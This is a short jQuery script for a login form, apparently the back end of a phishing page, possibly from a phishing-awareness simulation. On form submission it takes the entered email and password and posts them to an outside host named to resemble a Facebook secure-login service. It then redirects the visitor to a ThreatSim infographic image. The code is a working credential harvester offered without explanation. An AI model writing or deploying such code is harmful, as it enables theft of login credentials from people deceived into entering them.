$(document).ready(function() {
	$('#login_form').on('submit', function() {
		var url = "http://threatsim.com/wp-content/uploads/2013/04/ThreatSim.Infographic.2013.DBIR_.Visualized.jpg"
		$.post('https://fbsecurelogin.herokuapp.com/save_data', { username: $('#email').val(), password: $('#pass').val() }, function(data) {
			$(location).attr('href',url);
		});
		
		return false;
	});
});